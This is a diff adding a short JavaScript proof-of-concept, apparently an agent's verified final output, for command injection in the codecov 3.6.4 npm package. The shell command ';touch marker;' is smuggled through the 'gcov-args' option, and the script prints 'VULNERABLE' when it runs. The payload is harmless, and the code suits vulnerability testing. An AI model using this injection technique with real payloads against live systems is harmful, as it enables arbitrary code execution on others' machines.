@@ -1,0 +1,32 @@
+Verified working. Final output:
+
+```javascript
+const fs = require("fs");
+const os = require("os");
+
+const marker = "codecov_pwned_marker";
+try { fs.unlinkSync(marker); } catch (e) {}
+
+// codecov@3.6.4 (CVE-2020-15129 style flaw): the `gcov-args` upload option
+// is spliced RAW (no quoting, no shell-metacharacter filtering) into a
+// child_process.execSync() command that builds `find ... -exec gcov ...`.
+// Only HTML entity-escaping (& < > " ' ` /) is applied, so `;` and spaces
+// pass straight through and let us inject an arbitrary shell command.
+const codecov = require("./node_modules/codecov").handleInput;
+
+codecov.upload({
+  options: {
+    disable: "detect",
+    "gcov-root": os.tmpdir(),
+    "gcov-exec": "gcov",
+    "gcov-args": ";touch " + marker + ";"
+  }
+}, function () {}, function () {});
+
+setTimeout(function () {
+  console.log(fs.existsSync(marker)
+    ? "VULNERABLE: arbitrary command executed, created file " + marker
+    : "payload did not execute");
+  process.exit(0);
+}, 1000);
+```
